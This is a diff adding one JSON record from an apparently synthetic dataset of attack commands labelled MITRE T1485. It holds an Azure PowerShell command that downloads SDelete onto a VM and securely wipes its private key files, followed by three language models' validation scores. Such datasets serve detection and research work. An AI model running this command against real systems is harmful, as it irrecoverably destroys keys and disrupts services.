@@ -1,0 +1,56 @@
+{
+  "technique_id": "T1485",
+  "platform": "IaaS",
+  "shell": "PowerShell",
+  "command": "Invoke-AzVMRunCommand -ResourceGroupName 'RG-Keys' -Name 'WinVM-Keys' -CommandId 'RunPowerShellScript' -ScriptString \"Set-Location $env:TEMP; Invoke-WebRequest https://download.sysinternals.com/files/SDelete.zip -OutFile sdelete.zip; Expand-Archive -Path sdelete.zip -DestinationPath . -Force; & .\\sdelete.exe -accepteula -p 3 -s -q 'C:\\Keys\\*.pem' 'C:\\Keys\\*.pfx'\"",
+  "explanation": "Fetches SDelete and securely overwrites and deletes private key files (.pem, .pfx) in C:\\Keys on a Windows VM.",
+  "rationale_steps": [
+    "Identify sensitive key file patterns in the targeted folder.",
+    "Use SDelete with multiple passes to overwrite and remove the files irrevocably."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1485-28d85ee8-e7bbd23c",
+  "source_prompt_hash": "28d85ee8",
+  "timestamp_utc": "2025-09-30T08:03:27.709996Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper Azure PowerShell syntax, balanced quotes, correct parameter usage, and proper PowerShell script string formatting with appropriate command separators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with the T1485 Data Destruction technique by using SDelete (a secure deletion tool) with proper parameters (-p 3 for 3 passes, -s for subdirectories, -q for quiet mode) to permanently destroy private key files in the specified directory.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T02:46:08.317944Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell script string is perfectly well-formed with balanced quotes, valid command chaining using semicolons, proper cmdlet syntax, and correct executable invocation.",
+        "semantic_score": 5,
+        "semantic_justification": "The command perfectly aligns with T1485 Data Destruction by using SDelete (a tool specifically mentioned in the technique) to securely overwrite and delete sensitive key files, and while the prompt stated 'Privilege: None', `Invoke-AzVMRunCommand` typically executes as SYSTEM on Windows, ensuring sufficient permissions for the operation.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T02:46:21.232241Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The cmdlet and embedded PowerShell are well-formed with balanced quotes, valid parameters, and properly separated statements.",
+        "semantic_score": 4,
+        "semantic_justification": "It appropriately downloads and runs SDelete to securely overwrite and delete the specified key files (aligning with T1485), though using $env:TEMP inside a double-quoted ScriptString risks client-side expansion and minor operational failure.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T02:46:49.160899Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
